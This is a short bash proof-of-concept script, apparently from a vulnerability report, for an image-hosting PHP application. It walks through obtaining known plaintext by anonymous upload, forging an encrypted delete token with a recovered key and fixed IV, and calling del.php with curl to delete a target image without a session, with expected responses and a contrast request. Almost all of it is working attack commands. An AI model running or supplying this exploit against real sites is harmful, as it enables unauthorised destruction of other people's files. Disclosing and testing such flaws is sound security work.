#!/usr/bin/env bash
# EI2-02 steps 1+3 - known-plaintext acquisition and unauthenticated deletion.
# Step 1: upload own canary (anonymous upload on by default) -> legit del token + path
#   (pair = attacker's own returned "url" + "del" values; feed to recover_key.php)
# Step 3: forge token for the target path with the recovered key and delete WITHOUT a session.
# forge (php, same urlHash format):
#   php -r "echo base64_encode(openssl_encrypt('/i/2026/09/29/<TARGET>.png','AES-128-XTS','<RECOVERED_KEY>',0,'sciCuBC7orQtDhTO')),"
# then (MSYS/Git Bash users: export MSYS_NO_PATHCONV=1 to stop argv rewriting of /i/...):
curl -i "<BASE_URL>/app/del.php?hash=<FORGED_TOKEN>"
# -> {"code":200,"msg":"删除成功",...}  file removed from its URL
#    (image_recycl=1: moved to /i/recycle/; image_recycl=0: permanently unlinked)
# Contrast control (no hash param -> admin gate applies):
curl -i -X POST -d "mode=delete&url=/i/2026/09/29/<TARGET>.png" "<BASE_URL>/app/del.php"
# -> Permission denied
